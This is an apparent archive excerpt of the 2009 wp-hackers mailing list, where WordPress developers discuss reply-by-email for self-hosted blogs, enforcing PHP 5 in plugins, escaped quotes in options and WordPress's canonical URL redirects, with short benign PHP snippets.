> On Jul 14, 2009, at 10:16 AM, Stephane Daury wrote:
>
>  On Jul 14, 2009, at 2:38, Matt Mullenweg wrote:
>>
>>  On 7/13/2009 9:01 PM, Lynne Pope wrote:
>>>
>>>> How about releasing the source code so that those who wish to use it
>>>> can?
>>>> Or, better yet, release as a plugin.
>>>>
>>>
>
> With some work (mostly making sure there's no WordPress.com specific
> codisms) it could be pounded into a plugin.


That would be brilliant!


>> I'm planning on releasing it, but it'll probably be like the video server
>> and require a bit of setup to use fully.
>>
>> I also want to do a way for the WP.com post by email system to post to
>> wordpress.org blogs, or any XML-RPC endpoint.
>>
>
> I like the sound of that! :D
>



The second method of using WordPress.com as a hub so that any WordPress.org
> blog could use these features as well going to be much more popular.  That
> said I'll look at the code and see what needs to be done to wrap it into a
> plugin.


 Using wordpress.com as a hub would have more mass appeal, but could perhaps
raise issues for sites behind firewalls that are prevented from calling out.


If wordpress.com was used, would this impact on the ability of site owners
to trace emails back to source? Laws in some countries make the need to log
and trace very important.

Lynne

From lynne.pope at gmail.com  Tue Jul 14 23:53:37 2009
From: lynne.pope at gmail.com (Lynne Pope)
Date: Wed, 15 Jul 2009 11:53:37 +1200
Subject: [wp-hackers] readme.txt: "Requires PHP 5 tag"
In-Reply-To: <4A5CEF12.2050806@yoast.com>
References: <4A5CC0EE.6060102@elektroelch.de>
	<161617690907141341m66942ab7oec6136bad31d83c8@mail.gmail.com> 
	<4A5CEE05.4090204@yoast.com>
	<161617690907141346k6e88e4e7v46a46355cc8d822b@mail.gmail.com> 
	<4A5CEF12.2050806@yoast.com>
Message-ID: <427667db0907141653j1cb14c02t58239b5635893186@mail.gmail.com>

Hardly a "big, authoritative" website, but FWIW, the reasons Mambo decided
to go PHP5 are here: http://mambo-news.org/content/view/192/34/
Mambo was not part of the gophp5.org initiative as it was still evaluating
the impact on Mambo users at that time.

The three key factors in making the move were speed and security of code,
and the benefits to development with needing to only develop and test in one
version (at least until PHP6 starts gaining traction).

Lynne

2009/7/15 Joost de Valk <joost at yoast.com>

> I *know* but am just to lazy to write it up myself :)
>
>
> Otto wrote:
>
>> PHP 5 tends to be a lot easier and a lot faster, is all.
>>
>> There's a lot of really handy functions in newer PHP versions and
>> writing them yourself in PHP 4 is a pain in the arse. And then some
>> things are simply impossible to do in PHP 4 (proper timezone support,
>> for example).
>>
>> Also, PHP 5.1 is about 4 times faster than PHP 4, on average.
>>
>>
>> -Otto
>>
>>
>>
>> On Tue, Jul 14, 2009 at 3:43 PM, Joost de Valk<joost at yoast.com>  wrote:
>>
>>
>>> Is there a page somewhere on a "big, authoritative" website, that
>>> explains
>>> why PHP5 is cool and required etc. that people can link to?
>>>
>>> Best,
>>> Joost
>>>
>>>
>>
>>

From wp-hackers at striderweb.com  Wed Jul 15 02:05:43 2009
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Tue, 14 Jul 2009 21:05:43 -0500
Subject: [wp-hackers] readme.txt: "Requires PHP 5 tag"
In-Reply-To: <161617690907141341m66942ab7oec6136bad31d83c8@mail.gmail.com>
References: <4A5CC0EE.6060102@elektroelch.de>
	<161617690907141341m66942ab7oec6136bad31d83c8@mail.gmail.com>
Message-ID: <130AC951-2B9A-4A73-BF07-04C2F72772B5@striderweb.com>

That won't work for auto-updates (a plugin going from "works with PHP  
4+" to "works with PHP 5+").

The activation hook does not fire during auto update.

On Jul 14, 2009, at 3:41 PM, Otto wrote:

> Don't rely on users, they're invariably idiots. ;)
>
> Make your plugin smarter instead.
>
> /**
> * plugin_activation_check()
> *
> * Replace "plugin" with the name of your plugin
> */
> function plugin_activation_check(){
> 	if (version_compare(PHP_VERSION, '5.0.0', '<')) {
> 		deactivate_plugins(basename(__FILE__)); // Deactivate ourself
> 		wp_die("Sorry, but you can't run this plugin, it requires PHP 5 or  
> higher.");
> 	}
> }
> register_activation_hook(__FILE__, 'plugin_activation_check');


From dan at sproutventure.com  Wed Jul 15 05:52:30 2009
From: dan at sproutventure.com (Dan Cameron)
Date: Tue, 14 Jul 2009 22:52:30 -0700
Subject: [wp-hackers] URL Query Strings being Preserved
Message-ID: <4A5D6E9E.7000508@sproutventure.com>

Anyone run into an issue where a query string is being preserved 
throughout the site?

Thanks in advance.

Use case:

Load any page with http://blog.com?load=1
Navigational link ( e.g. next_posts_link ) preserver ?load=1

Example:

http://dancameron.org/category/asides?load=2
Then review the URL for "older posts" it shows 
http://dancameron.org/category/asides/page/2?load=2

I noticed some WP installs are not having this issue, i.e.
http://ma.tt/2009/07/headphone-recommendations/?load=2

From jaredbangs at gmail.com  Wed Jul 15 06:12:32 2009
From: jaredbangs at gmail.com (Jared Bangs)
Date: Tue, 14 Jul 2009 23:12:32 -0700
Subject: [wp-hackers] URL Query Strings being Preserved
In-Reply-To: <4A5D6E9E.7000508@sproutventure.com>
References: <4A5D6E9E.7000508@sproutventure.com>
Message-ID: <7b4922320907142312h10ba02ha756ffae49268803@mail.gmail.com>

I think it depends what you mean by "issue"; it looks like it's an
intentional "feature" to me.

For example, if you look in the wp-includes/link-template.php file at the
get_pagenum_link function (which is used by the previous_posts_link function
most themes use for paging back to older posts), it would seem that the
extraction and preservation of the query string arguments is done
intentionally, for the purpose of adding it back to the URL the function is
going to return.

Is it somehow causing trouble for you with something else? I wouldn't
consider it an error, since it could just as easily be regarded as desired
behavior.

As for other places where it doesn't appear to happen, there could be any
number of explanations: filters removing it, using different functions
within the template to get those links, etc.

On Tue, Jul 14, 2009 at 10:52 PM, Dan Cameron <dan at sproutventure.com> wrote:

> Anyone run into an issue where a query string is being preserved throughout
> the site?
>
> Thanks in advance.
>
> Use case:
>
> Load any page with http://blog.com?load=1
> Navigational link ( e.g. next_posts_link ) preserver ?load=1
>
> Example:
>
> http://dancameron.org/category/asides?load=2
> Then review the URL for "older posts" it shows
> http://dancameron.org/category/asides/page/2?load=2
>
> I noticed some WP installs are not having this issue, i.e.
> http://ma.tt/2009/07/headphone-recommendations/?load=2
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From daiv at daivmowbray.com  Wed Jul 15 08:09:05 2009
From: daiv at daivmowbray.com (Daiv Mowbray)
Date: Wed, 15 Jul 2009 10:09:05 +0200
Subject: [wp-hackers] single quote in plugin options
Message-ID: <5BB88894-BE93-42FC-9525-AFA2F0D87388@daivmowbray.com>


Hello List.

I am trying to find a solution.
My problem is: an option in one of my plugins includes single quotes.
for example, text field contains: 'href', 'rel', 'rev', 'title'
however, when saving the options,
the field now contains: \'href\', \'rel\', \'rev\', \'title\'
when I save the options a second time,
the field now contains: \\\'href\\\', \\\'rel\\\', \\\'rev\\\', \\ 
\'title\\\'

In my options form, I have tried to use :
echo attribute_escape($Options['myfield']);

I don't want to escape the single quotes, I want them to stay as
entered: 'href', 'rel', 'rev', 'title'

Any pointers greatly appreciated.

----------
Daiv Mowbray
daiv at daivmowbray.com
----------



From speedboxer at gmail.com  Wed Jul 15 08:26:45 2009
From: speedboxer at gmail.com (Matt Freedman)
Date: Wed, 15 Jul 2009 01:26:45 -0700
Subject: [wp-hackers] single quote in plugin options
In-Reply-To: <5BB88894-BE93-42FC-9525-AFA2F0D87388@daivmowbray.com>
References: <5BB88894-BE93-42FC-9525-AFA2F0D87388@daivmowbray.com>
Message-ID: <b88434820907150126lbbabe82uaa99335ca874f9a0@mail.gmail.com>

Use stripslashes() before displaying the option.


On Wed, Jul 15, 2009 at 1:09 AM, Daiv Mowbray<daiv at daivmowbray.com> wrote:
>
> Hello List.
>
> I am trying to find a solution.
> My problem is: an option in one of my plugins includes single quotes.
> for example, text field contains: 'href', 'rel', 'rev', 'title'
> however, when saving the options,
> the field now contains: \'href\', \'rel\', \'rev\', \'title\'
> when I save the options a second time,
> the field now contains: \\\'href\\\', \\\'rel\\\', \\\'rev\\\',
> \\\'title\\\'
>
> In my options form, I have tried to use :
> echo attribute_escape($Options['myfield']);
>
> I don't want to escape the single quotes, I want them to stay as
> entered: 'href', 'rel', 'rev', 'title'
>
> Any pointers greatly appreciated.
>
> ----------
> Daiv Mowbray
> daiv at daivmowbray.com
> ----------
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Matt Freedman
http://mattfreedman.ca/

From latz at elektroelch.de  Wed Jul 15 08:27:43 2009
From: latz at elektroelch.de (=?ISO-8859-1?Q?Lutz_Schr=F6er?=)
Date: Wed, 15 Jul 2009 10:27:43 +0200
Subject: [wp-hackers] readme.txt: "Requires PHP 5 tag"
In-Reply-To: <161617690907141341m66942ab7oec6136bad31d83c8@mail.gmail.com>
References: <4A5CC0EE.6060102@elektroelch.de>
	<161617690907141341m66942ab7oec6136bad31d83c8@mail.gmail.com>
Message-ID: <4A5D92FF.7000505@elektroelch.de>

Otto wrote:
> Don't rely on users, they're invariably idiots. ;)
>
> Make your plugin smarter instead.
>
> register_activation_hook(__FILE__, 'plugin_activation_check');
>
>   
My problems aren't those who update through the backend but those who 
update manually (downloading from wp.org, unzipping, uploading to blog).

I think I'm going to check for the PHP version and print a big hint in 
the backend (maybe even in the dashboard), and add a  small hint in the 
blog and only execute PHP4 code, so that the blog will not stop from 
rendering completely.

BTW: I stopped the auto-update by using 
add_filter('option_update_plugins', 'plugin_prevent_upgrade');. Works 
for me, I will blog this solution soon (or you can look it up in the 
"pagebar" plugin.

lutz

From daiv at daivmowbray.com  Wed Jul 15 09:56:32 2009
From: daiv at daivmowbray.com (Daiv Mowbray)
Date: Wed, 15 Jul 2009 11:56:32 +0200
Subject: [wp-hackers] single quote in plugin options
In-Reply-To: <b88434820907150126lbbabe82uaa99335ca874f9a0@mail.gmail.com>
References: <5BB88894-BE93-42FC-9525-AFA2F0D87388@daivmowbray.com>
	<b88434820907150126lbbabe82uaa99335ca874f9a0@mail.gmail.com>
Message-ID: <BB1819DD-1A08-47BD-843B-57B9FEB3228B@daivmowbray.com>


Thanx very much Matt,
stripslashes() is what I needed.
before display and before using in my javascript.


On Jul 15, 2009, at 10:26 AM, Matt Freedman wrote:

> Use stripslashes() before displaying the option.


----------
Daiv Mowbray
daiv at daivmowbray.com
----------



From jcanals at alkivia.com  Wed Jul 15 09:59:41 2009
From: jcanals at alkivia.com (Jordi Canals)
Date: Wed, 15 Jul 2009 11:59:41 +0200
Subject: [wp-hackers] readme.txt: "Requires PHP 5 tag"
In-Reply-To: <4A5D92FF.7000505@elektroelch.de>
References: <4A5CC0EE.6060102@elektroelch.de>
	<161617690907141341m66942ab7oec6136bad31d83c8@mail.gmail.com>
	<4A5D92FF.7000505@elektroelch.de>
Message-ID: <394db23a0907150259n72a44c3dq64866058e5e57b0f@mail.gmail.com>

I set a message on the section INSTALL on readme.txt, as a
requirement. But some users did not read anything before downloading
and installing, so, I manage like this on all my plugins:

On the main plugin file, I have just this:

/**
 * Sets an admin warning regarding required PHP version.
 *
 * @hook action 'admin_notices'
 * @return void
 */
function _ucom_php_warning() {

	$data = get_plugin_data(__FILE__);
	load_plugin_textdomain('akucom', false, basename(dirname(__FILE__)) .'/lang');

	echo '<div class="error"><p><strong>' . __('Warning:', 'akucom') . '</strong> '
		. sprintf(__('The active plugin %s is not compatible with your PHP
version.', 'akucom') .'</p><p>', '&laquo;' . $data['Name'] . ' ' .
$data['Version'] . '&raquo;')
		. sprintf(__('%s is required for this plugin.', 'akucom'), 'PHP-5 ')
. '</p></div>';
}

// Check required PHP version.
if ( version_compare(PHP_VERSION, '5.0.0', '<') ) {
	// Send an armin warning
	add_action('admin_notices', '_ucom_php_warning');
} else {
	include ( 'plugin-filename.php');
}

And all stuff goes into plugin-filename.php. This way users will
receive an admin notice on the dashboard and the plugin does nothing
if activated,

Best regards,

-- 
Jordi Canals [Txanny]
http://alkivia.org


2009/7/15 Lutz Schr?er <latz at elektroelch.de>:
> Otto wrote:
>>
>> Don't rely on users, they're invariably idiots. ;)
>>
>> Make your plugin smarter instead.
>>
>> register_activation_hook(__FILE__, 'plugin_activation_check');
>>
>>
>
> My problems aren't those who update through the backend but those who update
> manually (downloading from wp.org, unzipping, uploading to blog).
>
> I think I'm going to check for the PHP version and print a big hint in the
> backend (maybe even in the dashboard), and add a ?small hint in the blog and
> only execute PHP4 code, so that the blog will not stop from rendering
> completely.
>
> BTW: I stopped the auto-update by using add_filter('option_update_plugins',
> 'plugin_prevent_upgrade');. Works for me, I will blog this solution soon (or
> you can look it up in the "pagebar" plugin.
>
> lutz
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From jayarjo at gmail.com  Wed Jul 15 10:49:42 2009
From: jayarjo at gmail.com (Davit Barbakadze)
Date: Wed, 15 Jul 2009 14:49:42 +0400
Subject: [wp-hackers] can url auto-completing in wordpress by turned off
	somehow?
Message-ID: <9aa12a490907150349n6deb4927mcd80fb4a06807b0e@mail.gmail.com>

Today I noticed a strange behavior, which I have not noticed before. If
permalinks are activated and you enter just one letter after last slash
(like: domain.com/a) wordpress doesn't through 404 page, it automatically
redirects you to the first post with title starting with that letter (in our
example - with 'a'). Of course it useful in some cases, but in my it's not.
So... is there anyway to prevent that behavior?

-- 
Davit Barbakadze

From jeremy at visser.name  Wed Jul 15 11:16:15 2009
From: jeremy at visser.name (Jeremy Visser)
Date: Wed, 15 Jul 2009 21:16:15 +1000
Subject: [wp-hackers] can url auto-completing in wordpress by turned off
 somehow?
In-Reply-To: <9aa12a490907150349n6deb4927mcd80fb4a06807b0e@mail.gmail.com>
References: <9aa12a490907150349n6deb4927mcd80fb4a06807b0e@mail.gmail.com>
Message-ID: <1247656575.17513.4.camel@rillian.narnia.sunriseroad.net>

On Wed, 2009-07-15 at 14:49 +0400, Davit Barbakadze wrote:
> Today I noticed a strange behavior, which I have not noticed before. If
> permalinks are activated and you enter just one letter after last slash
> (like: domain.com/a) wordpress doesn't through 404 page, it automatically
> redirects you to the first post with title starting with that letter (in our
> example - with 'a'). Of course it useful in some cases, but in my it's not.
> So... is there anyway to prevent that behavior?

Before you go disabling that behaviour, I would urge you to keep it on.
One really useful thing it does is redirect you if half the URL is
chopped off -- i.e. in an e-mail.

http://example.com/2009/01/01/hello- will get successfully redirected to
http://example.com/2009/01/01/hello-world/

Also, it gives you nice little shortcuts to your blog posts, akin to
something like TinyURL. If you write a blog post titled "Shepherd's Pie
With Tripe And Fish Oil", and its permalink is
http://example.org/2009/01/01/shepherds-pie-with-tripe-and-fish-oil/ you
can just refer people to http://example.org/shepherds-pie and it will
redirect.

But if you *really* want to disable that behaviour, you can use this
plugin:

http://txfx.net/files/wordpress/disable-canonical-redirects.phps

It's a one-liner plugin that just does this:

  remove_filter('template_redirect', 'redirect_canonical');


From jayarjo at gmail.com  Wed Jul 15 11:56:59 2009
From: jayarjo at gmail.com (Davit Barbakadze)
Date: Wed, 15 Jul 2009 15:56:59 +0400
Subject: [wp-hackers] can url auto-completing in wordpress by turned off
	somehow?
In-Reply-To: <1247656575.17513.4.camel@rillian.narnia.sunriseroad.net>
References: <9aa12a490907150349n6deb4927mcd80fb4a06807b0e@mail.gmail.com>
	<1247656575.17513.4.camel@rillian.narnia.sunriseroad.net>
Message-ID: <9aa12a490907150456w6417004xeb808660bbf420c9@mail.gmail.com>

Thank you Jeremy.

You are right. However I do not see any other way to accomplish what I need.
Shortening in wp way may cause redirection to wrong post (when two long
title posts have the same prefix), may they?

I'm not sure whether I want to turn of canonical urls completely. I just
want the post or page to show up only if slug is present completely, I still
want to keep all other redirections. Investigating the problem I came to an
idea of "fixing" the query. I'm not yet sure if this will work - never've
been so deep in this part of wp.

On Wed, Jul 15, 2009 at 3:16 PM, Jeremy Visser <jeremy at visser.name> wrote:

> On Wed, 2009-07-15 at 14:49 +0400, Davit Barbakadze wrote:
> > Today I noticed a strange behavior, which I have not noticed before. If
> > permalinks are activated and you enter just one letter after last slash
> > (like: domain.com/a) wordpress doesn't through 404 page, it
> automatically
> > redirects you to the first post with title starting with that letter (in
> our
> > example - with 'a'). Of course it useful in some cases, but in my it's
> not.
> > So... is there anyway to prevent that behavior?
>
> Before you go disabling that behaviour, I would urge you to keep it on.
> One really useful thing it does is redirect you if half the URL is
> chopped off -- i.e. in an e-mail.
>
> http://example.com/2009/01/01/hello- will get successfully redirected to
> http://example.com/2009/01/01/hello-world/
>
> Also, it gives you nice little shortcuts to your blog posts, akin to
> something like TinyURL. If you write a blog post titled "Shepherd's Pie
> With Tripe And Fish Oil", and its permalink is
> http://example.org/2009/01/01/shepherds-pie-with-tripe-and-fish-oil/ you
> can just refer people to http://example.org/shepherds-pie and it will
> redirect.
>
> But if you *really* want to disable that behaviour, you can use this
> plugin:
>
> http://txfx.net/files/wordpress/disable-canonical-redirects.phps
>
> It's a one-liner plugin that just does this:
>
>  remove_filter('template_redirect', 'redirect_canonical');
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Davit Barbakadze

From jayarjo at gmail.com  Wed Jul 15 12:17:34 2009
From: jayarjo at gmail.com (Davit Barbakadze)
Date: Wed, 15 Jul 2009 16:17:34 +0400
Subject: [wp-hackers] can url auto-completing in wordpress by turned off
	somehow?
In-Reply-To: <1247656575.17513.4.camel@rillian.narnia.sunriseroad.net>
References: <9aa12a490907150349n6deb4927mcd80fb4a06807b0e@mail.gmail.com>
	<1247656575.17513.4.camel@rillian.narnia.sunriseroad.net>
Message-ID: <9aa12a490907150517i1144df8dt3b3669817d86d49e@mail.gmail.com>

Ok, I think I've found good way to do what I need, I hooked up my function
with lower priority (higher) then 'redirect_canonical'. I do what I need and
then return handle to default action. Is it good and safe enough?

Thank you for the tip.

On Wed, Jul 15, 2009 at 3:16 PM, Jeremy Visser <jeremy at visser.name> wrote:

> On Wed, 2009-07-15 at 14:49 +0400, Davit Barbakadze wrote:
> > Today I noticed a strange behavior, which I have not noticed before. If
> > permalinks are activated and you enter just one letter after last slash
> > (like: domain.com/a) wordpress doesn't through 404 page, it
> automatically
> > redirects you to the first post with title starting with that letter (in
> our
> > example - with 'a'). Of course it useful in some cases, but in my it's
> not.
> > So... is there anyway to prevent that behavior?
>
> Before you go disabling that behaviour, I would urge you to keep it on.
> One really useful thing it does is redirect you if half the URL is
> chopped off -- i.e. in an e-mail.
>
> http://example.com/2009/01/01/hello- will get successfully redirected to
> http://example.com/2009/01/01/hello-world/
>
> Also, it gives you nice little shortcuts to your blog posts, akin to
> something like TinyURL. If you write a blog post titled "Shepherd's Pie
> With Tripe And Fish Oil", and its permalink is
> http://example.org/2009/01/01/shepherds-pie-with-tripe-and-fish-oil/ you
> can just refer people to http://example.org/shepherds-pie and it will
> redirect.
>
> But if you *really* want to disable that behaviour, you can use this
> plugin:
>
> http://txfx.net/files/wordpress/disable-canonical-redirects.phps
>
> It's a one-liner plugin that just does this:
>
>  remove_filter('template_redirect', 'redirect_canonical');
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Davit Barbakadze

From wp-hackers at itsananderson.com  Wed Jul 15 12:40:30 2009
From: wp-hackers at itsananderson.com (Will Anderson)
Date: Wed, 15 Jul 2009 08:40:30 -0400
Subject: [wp-hackers] single quote in plugin options
In-Reply-To: <BB1819DD-1A08-47BD-843B-57B9FEB3228B@daivmowbray.com>
References: <5BB88894-BE93-42FC-9525-AFA2F0D87388@daivmowbray.com>
	<b88434820907150126lbbabe82uaa99335ca874f9a0@mail.gmail.com>
	<BB1819DD-1A08-47BD-843B-57B9FEB3228B@daivmowbray.com>
Message-ID: <6dbcd2670907150540h331fec17tbf685605896bad9b@mail.gmail.com>

By the way, those slashes are due to Magic Quotes, a feature that will be
removed in PHP 5.3 and 6. If you want to guard your code against future
releases, or you want to distribute it to people who might have Magic Quotes
disabled (which can be done fairly easily), you'll probably want to check
whether Magic Quotes are enabled before calling stripslashes. here's a good
article on Magic Quotes. At the bottom of the page you'll find a code
snippet that should give you a good idea of how to do this check.

http://www.tizag.com/phpT/php-magic-quotes.php

Best,
Will Anderson
http://www.itsananderson.com/

On Wed, Jul 15, 2009 at 5:56 AM, Daiv Mowbray <daiv at daivmowbray.com> wrote:

>
> Thanx very much Matt,
> stripslashes() is what I needed.
> before display and before using in my javascript.
>
>
> On Jul 15, 2009, at 10:26 AM, Matt Freedman wrote:
>
>  Use stripslashes() before displaying the option.
>>
>
>
> ----------
> Daiv Mowbray
> daiv at daivmowbray.com
> ----------
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Will Anderson
http://www.itsananderson.com/

From scribu at gmail.com  Wed Jul 15 13:16:15 2009
From: scribu at gmail.com (scribu)
Date: Wed, 15 Jul 2009 13:16:15 +0000
Subject: [wp-hackers] can url auto-completing in wordpress by turned off
	somehow?
In-Reply-To: <9aa12a490907150517i1144df8dt3b3669817d86d49e@mail.gmail.com>
References: <9aa12a490907150349n6deb4927mcd80fb4a06807b0e@mail.gmail.com>
	<1247656575.17513.4.camel@rillian.narnia.sunriseroad.net>
	<9aa12a490907150517i1144df8dt3b3669817d86d49e@mail.gmail.com>
Message-ID: <349fe48b0907150616t15fb561co73942e7c3650aed3@mail.gmail.com>

I assume you mean that you hooked your function before
redirect_canonical. That's what I would do.

On 7/15/09, Davit Barbakadze <jayarjo at gmail.com> wrote:
> Ok, I think I've found good way to do what I need, I hooked up my function
> with lower priority (higher) then 'redirect_canonical'. I do what I need and
> then return handle to default action. Is it good and safe enough?
>
> Thank you for the tip.
>
> On Wed, Jul 15, 2009 at 3:16 PM, Jeremy Visser <jeremy at visser.name> wrote:
>
>> On Wed, 2009-07-15 at 14:49 +0400, Davit Barbakadze wrote:
>> > Today I noticed a strange behavior, which I have not noticed before. If
>> > permalinks are activated and you enter just one letter after last slash
>> > (like: domain.com/a) wordpress doesn't through 404 page, it
>> automatically
>> > redirects you to the first post with title starting with that letter (in
>> our
>> > example - with 'a'). Of course it useful in some cases, but in my it's
>> not.
>> > So... is there anyway to prevent that behavior?
>>
>> Before you go disabling that behaviour, I would urge you to keep it on.
>> One really useful thing it does is redirect you if half the URL is
>> chopped off -- i.e. in an e-mail.
>>
>> http://example.com/2009/01/01/hello- will get successfully redirected to
>> http://example.com/2009/01/01/hello-world/
>>
>> Also, it gives you nice little shortcuts to your blog posts, akin to
>> something like TinyURL. If you write a blog post titled "Shepherd's Pie
>> With Tripe And Fish Oil", and its permalink is
>> http://example.org/2009/01/01/shepherds-pie-with-tripe-and-fish-oil/ you
>> can just refer people to http://example.org/shepherds-pie and it will
>> redirect.
>>
>> But if you *really* want to disable that behaviour, you can use this
>> plugin:
>>
>> http://txfx.net/files/wordpress/disable-canonical-redirects.phps
>>
>> It's a one-liner plugin that just does this:
>>
>>  remove_filter('template_redirect', 'redirect_canonical');
>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>
>
>
> --
> Davit Barbakadze
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>


-- 
http://scribu.net

From jer at simianuprising.com  Wed Jul 15 13:24:10 2009
From: jer at simianuprising.com (Jeremy Clarke)
Date: Wed, 15 Jul 2009 09:24:10 -0400
Subject: [wp-hackers] can url auto-completing in wordpress by turned off
	somehow?
In-Reply-To: <9aa12a490907150517i1144df8dt3b3669817d86d49e@mail.gmail.com>
References: <9aa12a490907150349n6deb4927mcd80fb4a06807b0e@mail.gmail.com>
	<1247656575.17513.4.camel@rillian.narnia.sunriseroad.net>
	<9aa12a490907150517i1144df8dt3b3669817d86d49e@mail.gmail.com>
Message-ID: <e1202cb10907150624i3dea597bwb6d8f1f1a32564b0@mail.gmail.com>

I had a situation where I wanted to disable canonical redirect only in
specific situations (?cat=5&m=200805). My solution was to first check
if the conditions were right, then disable it only if necessary.
Disabling canonical entirely is a *terrible* idea! It's super awesome
in a ton of ways that are invisible to you most of the time.

On Wednesday, July 15, 2009, Davit Barbakadze <jayarjo at gmail.com> wrote:
> Ok, I think I've found good way to do what I need, I hooked up my function
> with lower priority (higher) then 'redirect_canonical'. I do what I need and
> then return handle to default action. Is it good and safe enough?
>
> Thank you for the tip.
>
> On Wed, Jul 15, 2009 at 3:16 PM, Jeremy Visser <jeremy at visser.name> wrote:
>
>> On Wed, 2009-07-15 at 14:49 +0400, Davit Barbakadze wrote:
>> > Today I noticed a strange behavior, which I have not noticed before. If
>> > permalinks are activated and you enter just one letter after last slash
>> > (like: domain.com/a) wordpress doesn't through 404 page, it
>> automatically
>> > redirects you to the first post with title starting with that letter (in
>> our
>> > example - with 'a'). Of course it useful in some cases, but in my it's
>> not.
>> > So... is there anyway to prevent that behavior?
>>
>> Before you go disabling that behaviour, I would urge you to keep it on.
>> One really useful thing it does is redirect you if half the URL is
>> chopped off -- i.e. in an e-mail.
>>
>> http://example.com/2009/01/01/hello- will get successfully redirected to
>> http://example.com/2009/01/01/hello-world/
>>
>> Also, it gives you nice little shortcuts to your blog posts, akin to
>> something like TinyURL. If you write a blog post titled "Shepherd's Pie
>> With Tripe And Fish Oil", and its permalink is
>> http://example.org/2009/01/01/shepherds-pie-with-tripe-and-fish-oil/ you
>> can just refer people to http://example.org/shepherds-pie and it will
>> redirect.
>>
>> But if you *really* want to disable that behaviour, you can use this
>> plugin:
>>
>> http://txfx.net/files/wordpress/disable-canonical-redirects.phps
>>
>> It's a one-liner plugin that just does this:
>>
>> ?remove_filter('template_redirect', 'redirect_canonical');
>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>
>
>
> --
> Davit Barbakadze
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

-- 
Jeremy Clarke
Code and Design | globalvoicesonline.org

From joseph at josephscott.org  Wed Jul 15 15:38:23 2009
From: joseph at josephscott.org (Joseph Scott)
Date: Wed, 15 Jul 2009 09:38:23 -0600
Subject: [wp-hackers] Reply By Email in Self Hosted Blogs
In-Reply-To: <427667db0907141637k1cb61bc2sea83d66559f17aa1@mail.gmail.com>
References: <81eab60e-02d1-4032-b40d-048d74bcf837@r36g2000vbn.googlegroups.com>
	<1A7CDBB8-E715-4E6D-B02D-C27D2A26F39B@josephscott.org>
	<b88434820907131847x1a035134p313a50c37abb52fa@mail.gmail.com>
	<427667db0907132101pedf891eve1c6c02b354cdfba@mail.gmail.com>
	<4A5C2802.5060403@mullenweg.com>
	<81B782A6-229E-447D-92ED-73D859F5D643@tekartist.org>
	<96E1365D-913B-46E3-9BA4-ED62B915FAB2@josephscott.org>
	<427667db0907141637k1cb61bc2sea83d66559f17aa1@mail.gmail.com>
Message-ID: <2EDC46FE-EF4B-46FF-9C00-A29607C88F81@josephscott.org>


On Jul 14, 2009, at 5:37 PM, Lynne Pope wrote:
> Using wordpress.com as a hub would have more mass appeal, but could  
> perhaps
> raise issues for sites behind firewalls that are prevented from  
> calling out.
>
>
> If wordpress.com was used, would this impact on the ability of site  
> owners
> to trace emails back to source? Laws in some countries make the need  
> to log
> and trace very important.



That's a good question.  What I'd imagine is that the emails would go  
back to WordPress.com and then WordPress.com would communicate with  
your WordPress.org powered blog and add the new post or comment.  In  
that regard it would follow the same pattern as adding a new comment  
or post via email to a WordPress.com blog.

I don't know how that impact the various laws for email logging in  
other countries.

--
Joseph Scott
joseph at josephscott.org
http://josephscott.org/





From aaron at xavisys.com  Wed Jul 15 16:02:11 2009
From: aaron at xavisys.com (Aaron D. Campbell)
Date: Wed, 15 Jul 2009 09:02:11 -0700
Subject: [wp-hackers] readme.txt: "Requires PHP 5 tag"
In-Reply-To: <130AC951-2B9A-4A73-BF07-04C2F72772B5@striderweb.com>
References: <4A5CC0EE.6060102@elektroelch.de>	<161617690907141341m66942ab7oec6136bad31d83c8@mail.gmail.com>
	<130AC951-2B9A-4A73-BF07-04C2F72772B5@striderweb.com>
Message-ID: <4A5DFD83.7000902@xavisys.com>

Are you sure about that?  It looks like the deactivation hook is 
silently skipped, but it looks like the activation hook runs normally on 
an auto upgrade.

Stephen Rider wrote:
> That won't work for auto-updates (a plugin going from "works with PHP 
> 4+" to "works with PHP 5+").
>
> The activation hook does not fire during auto update.
>
> On Jul 14, 2009, at 3:41 PM, Otto wrote:
>
>> Don't rely on users, they're invariably idiots. ;)
>>
>> Make your plugin smarter instead.
>>
>> /**
>> * plugin_activation_check()
>> *
>> * Replace "plugin" with the name of your plugin
>> */
>> function plugin_activation_check(){
>>     if (version_compare(PHP_VERSION, '5.0.0', '<')) {
>>         deactivate_plugins(basename(__FILE__)); // Deactivate ourself
>>         wp_die("Sorry, but you can't run this plugin, it requires PHP 
>> 5 or higher.");
>>     }
>> }
>> register_activation_hook(__FILE__, 'plugin_activation_check');


From lynne.pope at gmail.com  Wed Jul 15 16:39:23 2009
From: lynne.pope at gmail.com (Lynne Pope)
Date: Thu, 16 Jul 2009 04:39:23 +1200
Subject: [wp-hackers] Reply By Email in Self Hosted Blogs
In-Reply-To: <2EDC46FE-EF4B-46FF-9C00-A29607C88F81@josephscott.org>
References: <81eab60e-02d1-4032-b40d-048d74bcf837@r36g2000vbn.googlegroups.com>
	<1A7CDBB8-E715-4E6D-B02D-C27D2A26F39B@josephscott.org>
	<b88434820907131847x1a035134p313a50c37abb52fa@mail.gmail.com> 
